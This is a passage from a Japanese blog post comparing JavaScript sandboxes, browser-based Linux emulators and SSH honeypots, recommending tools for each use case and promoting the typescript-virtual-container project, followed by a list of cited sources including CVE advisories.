| **仮想ネットワークL2/L3** | ❌ | ❌ | ❌ | 基本 | ❌ | ❌ | ❌ | ✅ 完全 |
| **仮想VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **ブラウザ対応** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.jsネイティブ** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **型付きAPI** | 基本 | ✅ | ✅ | 最小限 | ❌ | ✅ | ❌ | ✅ 完全 |
| **バイナリ互換性** | n/a | n/a | n/a | ✅ | ✅ | 部分的 | n/a | ❌ |
| **起動時間** | 即時 | 即時 | 即時 | 15–40秒 | 15–40秒 | 2–5秒 | 即時 | <1秒 |
| **RAM/インスタンス** | ~1 MB | ~3–10 MB | ~5–15 MB | 150–256 MB | 200+ MB | ~100 MB | ~50 MB | ~5–20 MB |
| **ランタイム依存関係** | 0 | 1（ネイティブ） | 1（Wasm） | 0 | プロプライエタリ | 1 | Python依存 | 3（ssh2, ws, fflate） |
| **ステータス** | 安定 | ✅ 活発 | ✅ 活発 | ✅ 非常に活発 | 商用 | ✅ 活発 | ✅ 活発 | ✅ 活発 |

---

## いつ何を使うべきか

**信頼できないJavaScriptを実行する必要がある----ユーザー提出のフォーミュラ、プラグイン、スクリプトフック。**
→ `isolated-vm`。本物のV8 Isolate、ハードメモリ制限、明示的な通信ブリッジ。`vm2`は避けろ----CVEリストが増え続けてる、マジで数ヶ月ごとに新しいやつが出てる。`vm`も避けろ----そもそもサンドボックスですらない、頼むから。

**JSをサンドボックス化したいが、ネイティブアドオンを使いたくない、またはブラウザ互換性が必要。**
→ `quickjs-emscripten`。Wasm境界、~500 KBモジュール、ブラウザとNodeで動作。V8より遅いが、真に分離されている。

**本物の未改変Linux OSをバイナリ互換性で起動する必要がある。**
→ 32ビットLinuxなら`v86`、既存のDockerイメージがあるなら`container2wasm`。150 MB+のRAMと30秒の起動時間を受け入れろ、それが条件だ。64ビットが必要なら、CheerpXか実際のコンテナランタイムを見ろ。

**バックエンドなしでWebアプリにLinuxライクなターミナルを埋め込む必要がある。**
→ `v86`（完全なOS、重い、起動が遅い）または`typescript-virtual-container`のブラウザバンドル（シミュレーター、軽量、即時起動、完全なデスクトップ用の`startxfce4`も含む。正直かなりクール）。

**インタラクティブなオンラインコーディングチュートリアルやブラウザIDEが必要。**
→ Node.jsエコシステム重視ならWebContainers。実際のLinuxユーザーランドが必要ならCheerpX。型付きAPIの軽量な選択肢が欲しいなら`typescript-virtual-container`のブラウザバンドル。

**SSH攻撃者のTTPを大規模に収集したい。**
→ Cowrieがプロダクション標準、以上。どのLinuxサーバーでも動作し、あらゆるSIEMと統合し、LLMモードもある。とにかくCowrieを使え。

**Node.jsアプリケーションでプログラム可能なAPIを持つSSHハニーポットデータが必要。**
→ `typescript-virtual-container`。コマンドが実際に実行される。VFSはスナップショットや差分が取れる実際のデータ構造だ。攻撃者は説得力のある対話型環境を得る。あなたはNodeを離れずに構造化された監査データを得る。

**DockerなしでCIでのシェル自動化/テストが必要。**
→ `typescript-virtual-container`。1秒未満で起動、テスト前にスナップショット、テスト後に復元。型付きAPIでシェルコマンドを実行。Dockerデーモン不要、カーネル不要、VM不要、待ち時間不要。

**マルチテナントシェル環境（SaaS、教育、訓練）が必要。**
→ `typescript-virtual-container`。インスタンスあたり5–20 MB vs エミュレーターの150–256 MB。100人の同時ユーザー：~2 GB vs ~25 GB。ホスティングコストに大きな差が出る！

**マルチVMネットワークラボも構築できる現実的なハニーポットが必要。**
→ `typescript-virtual-container`はこの分野で両方をこなせる唯一のものだ。

---

## できないこと（そしてこれについては正直でありたい）

ネイティブx86バイナリは実行できない。Cコードをコンパイルしたり、実際のPythonインタプリタを実行したり、Linux用にコンパイルされたソフトウェアを使用する必要がある場合、それらのシステムコールを支えるカーネルABIは存在しない。`gcc`、`python3`、`node`のようなコマンドはスタブだ----`--version`や一般的な呼び出しには応答するが、実際の処理は何も実行しない。

これが根本的なトレードオフだ：10–50倍低いメモリ、即時起動、ブラウザ互換性、型付きAPI、本物のSSH、仮想ネットワーキングを得る代わりに、Linuxユーザーランドとのバイナリ互換性を犠牲にする。

Fortuneはプロジェクトを設計する際にこれについて多くを考えた。彼女がターゲットにしていたユースケース----ハニーポット、テスト、埋め込みターミナル、CI環境----では、コンパイルされたバイナリを実行する必要性は実際には決して生じない。シェルパイプライン、ファイル操作、ネットワークルーティング、SSHでカバーできる。しかしユースケースが実際のコンパイル済みソフトウェアを必要とするなら、`v86`またはDockerが正しい答えであって、これではない。

---

## まとめ

というわけで……このエコシステムは外から見るよりもずっと広く、断片化している。`vm`はスコープ分離器であってサンドボックスではない。`vm2`はCVEを積み上げ続けている（マジで、今月のアドバイザリーをチェックしてみて）。`isolated-vm`は正しいJSサンドボックス化の答えだが、JSのみ。`quickjs-emscripten`はブラウザ互換性が必要だったり、ネイティブアドオンを避けたい場合の正しい選択だ。`v86`とCheerpXは、本当のバイナリ互換性が必要な場合の本物のエミュレーターだ。WebContainersはWasm内のNode.jsであって、汎用Linux環境ではない。CowrieはSSHハニーポットのゴールドスタンダードだが、PythonでNodeネイティブではない。

そして`typescript-virtual-container`----Fortuneのプロジェクト----は、独自のカテゴリに存在している。エミュレーターでもなく、JSサンドボックスでもなく、受動的ハニーポットでもない。それらの間の何かで、他のどれもできない多くのことに驚くほど役立つことがわかったものだ。

`typescript-virtual-container`は他のどれも触れていないギャップを埋める：完全でプログラム可能なLinuxシェル環境、本物のSSH、SFTP、POSIXパーミッション、ユーザー管理、仮想ネットワーキング、型付きTypeScript API----~10 MBで動作し、1秒未満で起動し、Node.jsとブラウザの両方で動作する。

試してみたいなら、ソースは[github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)にあり、ライブデモ（完全なデスクトップ用の`startxfce4`も含む、正直やばい）は[itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)にある。チェックしてみて、FortuneにGitHubでスターを送ってやってくれ。彼女はそれに値する！

読んでくれてありがとう----俺の基準でも長い記事だった :) 役に立ったなら嬉しい！

---

## 出典

各主張は可能な限り一次ソースにリンクするようにした----CVE勧告、公式ドキュメント、GitHubリポジトリ、メンテナーのブログ記事。いくつか注意点：vm2のCVEリストは増え続けているので、FortiGuardのリンクは読む頃には古くなっているかもしれない（最新情報はGitHubのアドバイザリーページをチェック）。Bellardのリンクはすべて安定している----彼の個人サイトは永遠にアップしていて、コンテンツは変わらない。ポリフィルについてもっと深く知りたければ、`typescript-virtual-container`リポジトリの`polyfills/`フォルダを直接見てほしい----ここに書けるどんな説明よりも読みやすい。

### JavaScriptサンドボックス

- **Node.js `vm`モジュール** -- 公式ドキュメント: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm`セキュリティ警告** -- 「vmモジュールはセキュリティ機構ではありません。信頼できないコードの実行に使用しないでください」: [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVEタイムライン** -- 完全なCVEリストと日付のFortiGuardアウトブレイクアラート: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- 非同期エラースタックエスケープ、GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Functionエスケープ、PoC gist: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- 完全なPoC付きExploit DBエントリ: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **vm2 2026 CVE** -- 11件の新たなサンドボックスエスケープ、分析: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **「なぜJSでのJSサンドボックス化が難しいか」** -- CVE-2022-36067に関するoxeye.ioのポストモーテム: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate内部** -- エンベッディングガイド: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJSエンジン** -- Fabrice Bellard作: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Denoパーミッションモデル** -- ドキュメント: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2リリース** -- 2024年10月: [deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealmプロポーザル** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartmentsプロポーザル** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **「JavaScriptコードのサンドボックス化」** -- Denoサンドボックスアプローチに関するAndrew Healeyの実践的記事: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linuxエミュレーター

- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · デモ: [copy.sh/v86](https://copy.sh/v86)
- **v86 OSサポートマトリックス** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS**（v86が使用するBIOS） -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE拡張**（VGAリファレンス） -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Bellardのエミュレーター: [bellard.org/jslinux](https://bellard.org/jslinux/) · 技術ノート（TinyEMU、歴史、asm.js→Wasm）: [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- Cソース: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · 非公式GitHubミラー: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- OpenRISC JSエミュレーター: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · デモ: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- ドキュメント: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreadsガイド: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · APIドキュメント: [webcontainers.io](https://webcontainers.io) · 発表記事: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ概要: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTTブログ記事: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willisonの記事: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### ターミナルスタック

- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · サイト: [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub（Microsoft）: [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### ハニーポット

- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · ドキュメント: [docs.cowrie.org](https://docs.cowrie.org) · サイト: [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub（アーカイブ）: [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- 最小限のNode.js SSHハニーポット: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- キュレーションリスト: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- システム情報探索（攻撃者がハニーポットをフィンガープリントする方法）: [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **ライブデモ**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **アーキテクチャガイド**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`**（SSHプロトコル実装） -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`**（VFSスナップショット圧縮） -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`**（WebSocketシェルトランスポート） -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### 背景資料

- **POSIXパーミッションモデル** -- Open Group仕様: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **書き込み先行ログ**（VFS永続化で使用されるパターン） -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolateモデル** -- 「Embedder's Guide」: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V ISA仕様**（TinyEMU/JSLinuxコンテキスト用） -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000アーキテクチャ** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **「Deno経由でPyodideサンドボックス内でPythonコードを実行する」** -- Simon Willison TIL、Wasmアプローチとの有用な対比: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **「自己ホスト型QuickJSをブラウザで実行する」** -- quickjs-emscriptenバンドルサイズに関するSimon Willison TIL: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
